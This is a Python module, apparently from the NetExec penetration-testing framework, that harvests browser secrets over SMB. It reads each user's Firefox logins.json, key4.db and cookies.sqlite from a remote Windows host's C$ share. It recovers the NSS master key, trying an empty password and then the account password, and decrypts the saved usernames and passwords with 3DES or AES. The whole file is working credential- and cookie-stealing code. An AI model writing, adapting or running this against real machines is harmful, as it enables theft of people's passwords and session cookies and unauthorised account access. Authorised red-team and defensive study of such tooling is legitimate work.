from base64 import b64decode
from binascii import unhexlify
from hashlib import pbkdf2_hmac, sha1
import hmac
import json
import ntpath
from os import remove
import sqlite3
import tempfile
from dataclasses import dataclass
from typing import Any
from Cryptodome.Cipher import AES, DES3
from pyasn1.codec.der import decoder
from dploot.lib.smb import DPLootSMBConnection

from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection

CKA_ID = unhexlify("f8000000000000000000000000000001")


class FirefoxData:
    def __init__(self, winuser: str, url: str, username: str, password: str):
        self.winuser = winuser
        self.url = url
        self.username = username
        self.password = password

@dataclass
class FirefoxCookie:
    winuser: str
    host: str
    path: str
    cookie_name: str
    cookie_value: str
    creation_utc: str
    expires_utc: str
    last_access_utc: str

class FirefoxTriage:
    """
    Firefox by @zblurx
    Inspired by firefox looting from DonPAPI
    https://github.com/login-securite/DonPAPI
    """

    firefox_generic_path = "Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    share = "C$"
    false_positive = (
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    )

    def __init__(self, target, logger, conn: DPLootSMBConnection = None, per_secret_callback: Any = None):
        self.target = target
        self.logger = logger
        self.conn = conn

        self.per_secret_callback = per_secret_callback

    def run(self, gather_cookies=False):
        if self.conn is None:
            upgrade_to_dploot_connection(target=self.target)

        firefox_data = []
        firefox_cookies = []
        # list users
        users = self.get_users()
        for user in users:
            try:
                directories = self.conn.remote_list_dir(share=self.share, path=self.firefox_generic_path.format(user))
            except Exception as e:
                if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                    continue
                self.logger.debug(e)
            if directories is None:
                continue
            for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
                try:
                    if gather_cookies:
                        cookies_path = ntpath.join(self.firefox_generic_path.format(user), d.get_longname(), "cookies.sqlite")
                        cookies_data = self.conn.readFile(self.share, cookies_path)
                        if cookies_data is not None:
                            firefox_cookies += self.parse_cookie_data(user, cookies_data)
                    logins_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\logins.json"
                    logins_data = self.conn.readFile(self.share, logins_path)
                    if logins_data is None:
                        continue  # No logins.json file found
                    logins = self.get_login_data(logins_data=logins_data)
                    if len(logins) == 0:
                        continue  # No logins profile found
                    key4_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\key4.db"
                    key4_data = self.conn.readFile(self.share, key4_path)
                    if key4_data is None:
                        continue
                    key = self.get_key(key4_data=key4_data)
                    if key is None and self.target.password != "":
                        key = self.get_key(
                            key4_data=key4_data,
                            master_password=self.target.password.encode(),
                        )
                    if key is None:
                        continue
                    for username, pwd, host in logins:
                        decoded_username = self.decrypt(key=key, iv=username[1], ciphertext=username[2]).decode("utf-8")
                        password = self.decrypt(key=key, iv=pwd[1], ciphertext=pwd[2]).decode("utf-8")
                        if password is not None and decoded_username is not None:
                            data = FirefoxData(
                                    winuser=user,
                                    url=host,
                                    username=decoded_username,
                                    password=password,
                                )
                            if self.per_secret_callback is not None:
                                self.per_secret_callback(data)
                            firefox_data.append(data)
                except Exception as e:
                    if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                        continue
                    self.logger.exception(e)
        return firefox_data

    def parse_cookie_data(self, windows_user, cookies_data):
        cookies = []
        fh = tempfile.NamedTemporaryFile(delete=False)
        fh.write(cookies_data)
        fh.seek(0)
        db = sqlite3.connect(fh.name)
        cursor = db.cursor()
        cursor.execute("SELECT name, value, host, path, expiry, lastAccessed, creationTime FROM moz_cookies;")
        for name, value, host, path, expiry, lastAccessed, creationTime in cursor:
            cookie = FirefoxCookie(
                    winuser=windows_user,
                    host=host,
                    path=path,
                    cookie_name=name,
                    cookie_value=value,
                    creation_utc=creationTime,
                    last_access_utc=lastAccessed,
                    expires_utc=expiry,
                )
            if self.per_secret_callback is not None:
                self.per_secret_callback(cookie)
            cookies.append(cookie)
        return cookies

    def get_login_data(self, logins_data):
        json_logins = json.loads(logins_data)
        if "logins" not in json_logins:
            return []  # No logins key in logins.json file
        return [
            (
                self.decode_login_data(row["encryptedUsername"]),
                self.decode_login_data(row["encryptedPassword"]),
                row["hostname"],
            )
            for row in json_logins["logins"]
        ]

    def get_key(self, key4_data, master_password=b""):
        # Instead of disabling "delete" and removing the file manually,
        # in the future (py3.12) we could use "delete_on_close=False" as a cleaner solution
        # Related issue: #134
        fh = tempfile.NamedTemporaryFile(delete=False)
        fh.write(key4_data)
        fh.seek(0)
        db = sqlite3.connect(fh.name)
        cursor = db.cursor()
        cursor.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
        row = next(cursor)

        if row:
            global_salt, master_password, _ = self.is_master_password_correct(key_data=row, master_password=master_password)
            if global_salt:
                try:
                    cursor.execute("SELECT a11,a102 FROM nssPrivate;")
                    for row in cursor:
                        if row[0]:
                            break
                    a11 = row[0]
                    a102 = row[1]
                    if a102 == CKA_ID:
                        decoded_a11 = decoder.decode(a11)
                        key = self.decrypt_3des(decoded_a11, master_password, global_salt)
                        if key is not None:
                            fh.close()
                            return key[:24]
                except Exception as e:
                    self.logger.debug(e)
                    fh.close()
                    return b""
        db.close()
        fh.close()
        try:
            remove(fh.name)
        except Exception as e:
            self.logger.error(f"Error removing temporary file: {e}")

    def is_master_password_correct(self, key_data, master_password=b""):
        try:
            entry_salt = b""
            global_salt = key_data[0]  # Item1
            item2 = key_data[1]
            decoded_item2 = decoder.decode(item2)
            cleartext_data = self.decrypt_3des(decoded_item2, master_password, global_salt)
            if cleartext_data != b"password-check\x02\x02":
                return "", "", ""
            return global_salt, master_password, entry_salt
        except Exception as e:
            self.logger.debug(e)
            return "", "", ""

    def get_users(self):
        users = []

        users_dir_path = "Users\\*"
        directories = self.conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))

        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())  # noqa: PERF401, ignoring for readability
        return users

    @staticmethod
    def decode_login_data(data):
        asn1data = decoder.decode(b64decode(data))
        return (
            asn1data[0][0].asOctets(),
            asn1data[0][1][1].asOctets(),
            asn1data[0][2].asOctets(),
        )

    @staticmethod
    def decrypt(key, iv, ciphertext):
        """Decrypt ciphered data (user / password) using the key previously found"""
        cipher = DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv)
        data = cipher.decrypt(ciphertext)
        nb = data[-1]
        try:
            return data[:-nb]
        except Exception:
            return data

    @staticmethod
    def decrypt_3des(decoded_item, master_password, global_salt):
        """User master key is also encrypted (if provided, the master_password could be used to encrypt it)"""
        # See http://www.drh-consultancy.demon.co.uk/key3.html
        pbeAlgo = str(decoded_item[0][0][0])
        if pbeAlgo == "1.2.840.113549.1.12.5.1.3":  # pbeWithSha1AndTripleDES-CBC
            entry_salt = decoded_item[0][0][1][0].asOctets()
            cipher_t = decoded_item[0][1].asOctets()

            # See http://www.drh-consultancy.demon.co.uk/key3.html
            hp = sha1(global_salt + master_password).digest()
            pes = entry_salt + b"\x00" * (20 - len(entry_salt))
            chp = sha1(hp + entry_salt).digest()
            k1 = hmac.new(chp, pes + entry_salt, sha1).digest()
            tk = hmac.new(chp, pes, sha1).digest()
            k2 = hmac.new(chp, tk + entry_salt, sha1).digest()
            k = k1 + k2
            iv = k[-8:]
            key = k[:24]
            cipher = DES3.new(key=key, mode=DES3.MODE_CBC, iv=iv)
            return cipher.decrypt(cipher_t)
        elif pbeAlgo == "1.2.840.113549.1.5.13":  # pkcs5 pbes2
            assert str(decoded_item[0][0][1][0][0]) == "1.2.840.113549.1.5.12"
            assert str(decoded_item[0][0][1][0][1][3][0]) == "1.2.840.113549.2.9"
            assert str(decoded_item[0][0][1][1][0]) == "2.16.840.1.101.3.4.1.42"
            # https://tools.ietf.org/html/rfc8018#page-23
            entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
            iteration_count = int(decoded_item[0][0][1][0][1][1])
            key_length = int(decoded_item[0][0][1][0][1][2])
            assert key_length == 32

            k = sha1(global_salt + master_password).digest()
            key = pbkdf2_hmac("sha256", k, entry_salt, iteration_count, dklen=key_length)

            # https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49
            iv = b"\x04\x0e" + decoded_item[0][0][1][1][1].asOctets()
            # 04 is OCTETSTRING, 0x0e is length == 14
            encrypted_value = decoded_item[0][1].asOctets()
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return cipher.decrypt(encrypted_value)
